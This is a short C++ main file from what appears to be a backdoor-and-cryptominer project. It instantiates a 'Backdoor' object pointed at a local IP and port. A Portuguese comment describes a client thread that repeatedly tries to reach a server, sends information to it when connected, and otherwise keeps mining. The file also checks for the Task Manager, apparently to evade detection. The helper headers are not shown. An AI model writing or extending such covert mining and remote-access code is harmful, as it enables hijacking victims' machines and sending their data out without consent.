#include "communication.h"
#include "tasks.h"
#include "backdoor.h"

#define IP "127.0.0.1"
#define PORT 8000

int main(int argc, char * argv[]){

    Backdoor b (IP, PORT, false);



    /*

    CLIENT VAI CRIAR UMA THREAD PRA TENTAR FICAR SE CONECTANDO COM O SERVIDOR 

    SE CONSEGUIR SE CONECAR, FICA ENVIANDO INFORMAÇÕES PRO SERVIDOR

    SE NÃO CONSEGUIR SE CONECTAR, ELE APENAS CONTINUA MINERANDO

    */

    //std::thread multithreading(Tasks::check_task_manager);
    Tasks::check_task_manager();
    if(Tasks::lock_task_manager){
        std::cout << "true" << std::endl;
    }else{
        std::cout << "false" << std::endl;
    }

    /*
    std::cout << "hello world!" << std::endl;
    Communication c("127.0.0.1", 8888);

    while(true){
        c.connect_forever();

        std::string output = c.recv_message();
        if(output.length() == 0){
            Error::log_error("connection finished");
        }
        c.send_message("sup brother");
    }*/
}